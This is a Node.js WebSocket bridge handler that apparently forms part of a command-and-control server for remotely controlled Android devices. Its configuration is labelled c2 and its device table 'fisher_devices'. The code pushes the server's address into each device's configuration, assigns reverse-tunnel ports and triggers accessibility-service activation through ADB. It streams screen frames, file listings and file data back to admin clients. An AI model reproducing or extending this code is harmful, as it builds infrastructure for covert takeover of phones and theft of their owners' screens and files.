'use strict';

const { broadcastToAdmins, forwardFrameToAdmins } = require('./admin');
const { getPool, dbWithRetry } = require('../services/commandPoller');
const { allowWrite: wtAllow, markWritten: wtMark } = require('../services/writeThrottle');
const config = require('../../config');

/**
 * local-service Bridge WebSocket handler
 * 路径: /ws/bridge?deviceId=xxx
 */
function handleBridge(ws, deviceId, connections) {
  connections.bridges.set(deviceId, { ws, deviceId, lastActivity: Date.now() });
  console.log(`[WS-Bridge] Connected: ${deviceId}`);

  // 更新数据库：设备上线 + local_service_connected
  updateBridgeStatus(deviceId, true);

  // ★ Bridge 连接时主动预分配独立端口（不等 setServerAddr 触发）
  preAllocatePortOnBridge(deviceId).then(port => {
    if (port) console.log(`[WS-Bridge] pre-allocated remote_port=${port} for ${deviceId.substring(0, 12)}...`);
  }).catch(e => console.error(`[WS-Bridge] pre-allocate port ERROR for ${deviceId.substring(0, 12)}...: ${e.message}`));

  // ★ AUTO-FIX: Bridge 连接后立即配置 local-service（与旧 Python 后端一致）
  const serverAddr = config.c2.authority;
  const serverHttpBase = config.c2.httpBase;
  const serverWsBase = config.c2.wsBase;
  const fixCommands = [
    // ★ 已移除 localAdbConnect：避免每次 Bridge 连上自动开启 ADB
    // 需要开 ADB 时，通过前端 /api/device/adb-wifi 接口手动启用
    { command: 'scanDebugPort' },
    // ★ 推送 deviceId + serverAddr 到设备 conf（核心：解决设备不传 deviceId 问题）
    { command: 'setAppConfig', params: { deviceId: deviceId, serverAddr: serverHttpBase } },
    { command: 'syncMainServerHost', params: { serverHost: serverAddr, host: serverAddr } },
    { command: 'setConfig', params: { serverAddr, serverHost: serverAddr, deviceId: deviceId, bridgeUrl: `${serverWsBase}/ws/bridge?deviceId=${encodeURIComponent(deviceId)}` } },
    { command: 'saveConfig' },
    { command: 'forceSync' },
    // ★ 触发 Go 重新 fetchFrpcConfigFromServer（带 deviceId），获取正确的 remote_port
    { command: 'setServerAddr', params: { serverAddr: serverHttpBase } },
  ];

  let delay = 1000;
  for (const cmd of fixCommands) {
    setTimeout(() => {
      try {
        if (ws.readyState === 1) {
          ws.send(JSON.stringify(cmd));
        }
      } catch (e) {}
    }, delay);
    delay += 300;
  }
  console.log(`[WS-Bridge] Scheduled ${fixCommands.length} AUTO-FIX commands for ${deviceId}`);

  // 如果设备没有 ws/session 连接，通过 bridge 发送命令让 APK 重启无障碍服务（会触发 WS 重连）
  setTimeout(() => {
    try {
      if (ws.readyState === 1 && !connections.devices.has(deviceId)) {
        // 发送 enableAccessibility 让 local-service 通过 ADB 重启无障碍
        ws.send(JSON.stringify({ command: 'enableAccessibility' }));
        console.log(`[WS-Bridge] Sent enableAccessibility to ${deviceId} (no device connection, trying to restore WS)`);
      }
    } catch (e) {}
  }, 5000);

  // 通知管理端
  broadcastToAdmins(connections, {
    type: 'bridge_connected',
    deviceId,
    data: { localServiceConnected: true, status: 'online' },
  });
  broadcastToAdmins(connections, { type: 'device_update' });

  // 定时更新 last_seen（每30秒）充当心跳
  const heartbeatInterval = setInterval(() => {
    if (ws.readyState === 1) {
      updateLastSeen(deviceId);
    }
  }, 30000);

  // Keep protocol ping/pong opt-in for compatibility with local-service clients.
  let isAlive = true;
  const protocolPingEnabled = process.env.NODE_WS_PROTOCOL_PING === '1';
  let serverPingInterval = null;
  if (protocolPingEnabled) {
    ws.on('pong', () => { isAlive = true; });
    serverPingInterval = setInterval(() => {
      if (ws.readyState !== 1) return;
      if (!isAlive) {
        console.log('[WS-Bridge] Ping timeout, terminating zombie connection: ' + deviceId);
        ws.terminate();
        return;
      }
      isAlive = false;
      try { ws.ping(); } catch (e) {}
    }, 30000);
  }

  ws.on('message', (data) => {
    // ★ Stability: wrap entire handler body in try/catch to prevent unhandled
    // exceptions in handler/forwarding logic from crashing the WS server.
    try {
      // 每次收到消息都标记活跃
      const conn = connections.bridges.get(deviceId);
      if (conn) conn.lastActivity = Date.now();
      // 尝试将 Buffer 解析为 JSON（bridge 可能以二进制帧发送 JSON 响应）
      if (Buffer.isBuffer(data) || data instanceof ArrayBuffer) {
        const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
        // 检查是否以 '{' 或 '[' 开头（JSON）
        if (buf.length > 0 && (buf[0] === 0x7b || buf[0] === 0x5b)) {
          try {
            const str = buf.toString('utf8');
            const msg = JSON.parse(str);
            console.log(`[WS-Bridge] <<<< Received JSON from ${deviceId}:`, str.substring(0, 200));
            handleBridgeMessage(ws, msg, deviceId, connections);
            return;
          } catch {}
        }
        // 真正的二进制帧 = 屏幕画面
        forwardFrameToAdmins(deviceId, data, connections);
        return;
      }

      try {
        const msg = JSON.parse(data.toString());
        console.log(`[WS-Bridge] <<<< Received from ${deviceId}:`, JSON.stringify(msg).substring(0, 200));
        handleBridgeMessage(ws, msg, deviceId, connections);
      } catch (err) {
        console.error(`[WS-Bridge] Parse error from ${deviceId}:`, err.message);
      }
    } catch (err) {
      console.error(`[WS-Bridge] Unhandled error in message handler for ${deviceId}:`, err && err.message ? err.message : err);
    }
  });

  // ★ FIX: WS 连接池竞态误删（2026-08-06）
  // 归属校验：仅当连接池中仍是当前 ws 时才执行清理
  function isCurrentBridgeConnection() {
    const cur = connections.bridges.get(deviceId);
    return cur && cur.ws === ws;
  }

  ws.on('close', () => {
    clearInterval(heartbeatInterval);
    clearInterval(serverPingInterval);
    if (!isCurrentBridgeConnection()) return;  // ★ 归属校验，被新连接覆盖则不清理
    connections.bridges.delete(deviceId);
    // 只有当没有 device WS 连接时才标记设备为离线
    const hasDeviceWs = connections.devices.has(deviceId);
    updateBridgeStatus(deviceId, false, hasDeviceWs);
    broadcastToAdmins(connections, {
      type: 'bridge_disconnected',
      deviceId,
      data: { localServiceConnected: false, status: hasDeviceWs ? 'online' : 'offline' },
    });
    broadcastToAdmins(connections, { type: 'device_update' });
    console.log(`[WS-Bridge] Disconnected: ${deviceId}`);
  });

  ws.on('error', () => {
    clearInterval(heartbeatInterval);
    clearInterval(serverPingInterval);
    if (!isCurrentBridgeConnection()) return;  // ★ 归属校验，同上
    connections.bridges.delete(deviceId);
    const hasDeviceWs = connections.devices.has(deviceId);
    updateBridgeStatus(deviceId, false, hasDeviceWs);
  });
}

/**
 * 更新 bridge 连接/断开状态
 * ★ 2026-09-03 死锁修复：
 *   - 所有 UPDATE 走 dbWithRetry 自动重试
 *   - 上线 UPDATE 前走 writeThrottle（last_seen/public_ip 10s 内已刷则跳过）
 *   - 死锁类异常降级为 warn，不打 error 避免日志爆炸
 */
async function updateBridgeStatus(deviceId, connected, hasOtherConnection = false) {
  try {
    const db = getPool();
    const now = Math.floor(Date.now() / 1000);
    const shortId = String(deviceId).substring(0, 12);
    if (connected) {
      // bridge 上线：只在 10s 窗口内未刷过 last_seen 时才写，避免与 device WS 心跳抢锁
      const needLastSeen = wtAllow(deviceId, 'last_seen');
      const setParts = ['is_connected=1', 'local_service_connected=1', 'connected_at=?'];
      const params = [now];
      if (needLastSeen) { setParts.push('last_seen=?'); params.push(now); }
      params.push(deviceId);
      await dbWithRetry(
        () => db.query(`UPDATE fisher_devices SET ${setParts.join(',')} WHERE device_id=?`, params),
        { label: `BridgeStatus:ON:${shortId}`, maxRetries: 3 }
      );
      if (needLastSeen) wtMark(deviceId, 'last_seen');
    } else {
      if (hasOtherConnection) {
        // 还有其他连接（device WS），只标记 local_service_connected=0
        await dbWithRetry(
          () => db.query(
            'UPDATE fisher_devices SET local_service_connected=0 WHERE device_id=?',
            [deviceId]
          ),
          { label: `BridgeStatus:LOCAL_OFF:${shortId}`, maxRetries: 3 }
        );
      } else {
        // 无任何连接 → 离线
        await dbWithRetry(
          () => db.query(
            'UPDATE fisher_devices SET local_service_connected=0, is_connected=0 WHERE device_id=?',
            [deviceId]
          ),
          { label: `BridgeStatus:OFF:${shortId}`, maxRetries: 3 }
        );
      }
    }
  } catch (err) {
    if (/Deadlock found|Lock wait timeout/i.test(err.message || '')) {
      console.warn(`[WS-Bridge] BridgeStatus give up (${shortId}...): ${err.message}`);
    } else {
      console.error('[WS-Bridge] DB error:', err.message);
    }
  }
}

/**
 * 更新 last_seen（定时心跳）
 * ★ 2026-09-03 死锁修复：
 *   - 先过 writeThrottle：10s 内 device WS / syncDeviceStatus / bridge 任意一个刷过 last_seen 就跳过
 *   - dbWithRetry 兜底自动重试
 */
async function updateLastSeen(deviceId) {
  try {
    // 内存去抖：10 秒内重复心跳直接跳过（最有效的减锁手段）
    if (!wtAllow(deviceId, 'last_seen')) return;
    const db = getPool();
    const now = Math.floor(Date.now() / 1000);
    await dbWithRetry(
      () => db.query('UPDATE fisher_devices SET last_seen=? WHERE device_id=?', [now, deviceId]),
      { label: `Bridge:lastSeen:${String(deviceId).substring(0, 8)}`, maxRetries: 2 }
    );
  } catch (err) {
    if (/Deadlock found|Lock wait timeout/i.test(err.message || '')) {
      // 静默：下一个心跳 tick（30s 后）自然会再次尝试（到那时 10s 去抖窗口也过了）
    } else {
      console.error('[WS-Bridge] updateLastSeen error:', err.message);
    }
  }
}

function handleBridgeMessage(ws, msg, deviceId, connections) {
  const { type } = msg;
  console.log(`[WS-Bridge] handleBridgeMessage type='${type}' from ${deviceId}`);

  switch (type) {
    case 'command_result':
      // 命令执行结果
      console.log(`[WS-Bridge] >>>> Forwarding command_result to admins from ${deviceId}:`, JSON.stringify(msg.data || msg).substring(0, 200));
      broadcastToAdmins(connections, {
        type: 'command_result',
        deviceId,
        data: msg.data || msg,
      });
      break;

    case 'screenshot':
    case 'screen_frame':
      // 截图/帧数据（JSON 格式的 base64）
      broadcastToAdmins(connections, { ...msg, deviceId });
      break;

    case 'file_list':
    case 'file_data':
      // 文件操作结果
      broadcastToAdmins(connections, { ...msg, deviceId });
      break;

    case 'heartbeat':
      ws.send(JSON.stringify({ type: 'heartbeat_ack' }));
      break;

    default:
      // 透传给管理端
      console.log(`[WS-Bridge] >>>> Forwarding default msg to admins from ${deviceId}: type='${type}'`);
      broadcastToAdmins(connections, { ...msg, deviceId });
  }
}

/**
 * ★ Bridge 连接时主动分配独立端口
 * 端口池：19902-29999，行锁防并发
 * 返回分配的端口号；未分配返回 null
 */
async function preAllocatePortOnBridge(deviceId) {
  if (!deviceId) return null;
  let db = null;
  try {
    db = getPool();
  } catch (e) {
    return null;
  }
  const conn = await db.getConnection();
  try {
    await conn.beginTransaction();
    // 1. 已有端口且 >= 19902 直接返回
    const [rows] = await conn.execute(
      'SELECT remote_port FROM fisher_devices WHERE device_id = ? LIMIT 1',
      [deviceId]
    );
    if (rows.length > 0 && rows[0].remote_port >= 19902) {
      await conn.commit();
      return rows[0].remote_port;
    }
    // 2. 找 max+1
    const [maxRows] = await conn.execute(
      'SELECT MAX(remote_port) as mx FROM fisher_devices WHERE remote_port >= 19902 AND remote_port <= 29999'
    );
    let newPort = (maxRows[0]?.mx || 19901) + 1;
    if (newPort < 19902) newPort = 19902;
    // 3. 100 次循环防撞
    let attempts = 0;
    while (attempts < 100 && newPort <= 29999) {
      const [occ] = await conn.execute(
        'SELECT COUNT(*) as c FROM fisher_devices WHERE remote_port = ? AND device_id <> ?',
        [newPort, deviceId]
      );
      if (occ[0].c === 0) break;
      newPort++;
      attempts++;
    }
    if (newPort > 29999) {
      throw new Error('no available ports (19902-29999 all occupied)');
    }
    // 4. 写入 DB
    await conn.execute(
      'UPDATE fisher_devices SET remote_port = ?, tunnel_deployed = 1 WHERE device_id = ?',
      [newPort, deviceId]
    );
    await conn.commit();
    return newPort;
  } catch (e) {
    try { await conn.rollback(); } catch {}
    throw e;
  } finally {
    conn.release();
  }
}

module.exports = { handleBridge, preAllocatePortOnBridge };
